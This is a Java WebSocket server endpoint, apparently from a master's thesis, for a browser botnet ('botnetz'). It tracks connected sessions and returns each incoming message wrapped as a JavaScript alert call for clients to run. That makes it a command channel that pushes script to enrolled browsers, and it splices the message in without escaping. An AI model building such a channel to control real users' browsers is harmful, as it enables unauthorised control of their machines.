package fhws.masterarbeit.botnetz.server;

import java.io.IOException;

import javax.websocket.OnClose;
import javax.websocket.OnError;
import javax.websocket.OnMessage;
import javax.websocket.OnOpen;
import javax.websocket.Session;
import javax.websocket.server.ServerEndpoint;

import fhws.masterarbeit.botnetz.data.SessionMonitor;

@ServerEndpoint("/botnetz")
public class BotnetzClientWebsocket 
{
	private Session session;
	private SessionMonitor sessionMonitor;
	
	@OnOpen
	public void onOpen(Session session)
	{
		this.session = session;
		this.sessionMonitor = SessionMonitor.getSessionMonitor();
		this.sessionMonitor.addSession(this.session);
	}//end method onOpen
	
	@OnMessage
	public void onMessage(String message)
	{
		try 
		{
			session.getBasicRemote().sendText("alert('" + message + "')");
		}//end try 
		catch (IOException e) 
		{
			System.out.println("IOException: " + e.getStackTrace());
		}//end catch IOException
	}//end method onMessage
	
	@OnError
	public void onError(Throwable t)
	{
		System.out.println("Exception: " + t.getStackTrace() + t.getCause());
	}//end method onError
	
	@OnClose
	public void onClose()
	{
		sessionMonitor.removeSession(this.session);
		try 
		{
			session.close();
		}//end try
		catch (IOException e) 
		{
			System.out.println("IOException" + e.getStackTrace());
		}//end catch IOException
	}//end method onClose
}//end class BotnetzClientWebsocket
